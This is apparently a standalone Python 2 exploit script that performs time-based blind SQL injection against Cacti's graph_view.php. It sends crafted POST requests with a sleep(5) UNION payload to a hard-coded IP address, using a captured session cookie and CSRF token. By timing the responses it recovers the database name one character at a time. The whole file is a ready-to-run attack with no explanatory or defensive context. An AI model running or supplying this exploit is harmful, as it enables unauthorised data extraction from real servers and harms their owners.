#!/usr/bin/python
# -*- coding: UTF-8 -*-
import httplib
import time
import string
import sys
import random
import urllib
import math

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Cookie':
    'cacti_zoom=zoomMode%3Dquick%2CzoomOutPositioning%3Dcenter%2CzoomOutFactor%3D2%2CzoomMarkers%3Dtrue%2CzoomTimestamps%3Dauto%2Czoom3rdMouseButton%3Dfalse; Cacti=7a3e072f5ab62febf94fbedda5128fd0'
}

payloads = 'abcdefghijklmnopqrstuvwxyz0123456789@_.'
print 'Starting to retrive MySQL DB:'

db = ''
user = ''

for i in range(1, 6):

    for payload in payloads:
        s = "__csrf_magic=sid:c766dcdb84bc21215af88d112bc9c4f2edc517b4,1458794525&host_group_data=graph_template:1 union select case when ord(substring((select database()) from %s for %s)) between %s and %s then sleep(5) else 0 end" % (
            i, i, ord(payload), ord(payload))

        conn = httplib.HTTPConnection('175.102.18.59', timeout=60)

        conn.request(method='POST',
                     url='/cacti/graph_view.php?action=tree_content',
                     body=s,
                     headers=headers)

        start_time = time.time()

        conn.getresponse()

        conn.close()

        print '.',

        if time.time() - start_time > 5.0:

            db += payload

            print '\n\n[In progress]', db,

            break

print '\n\n[Done] Current database is %s ' % (db)
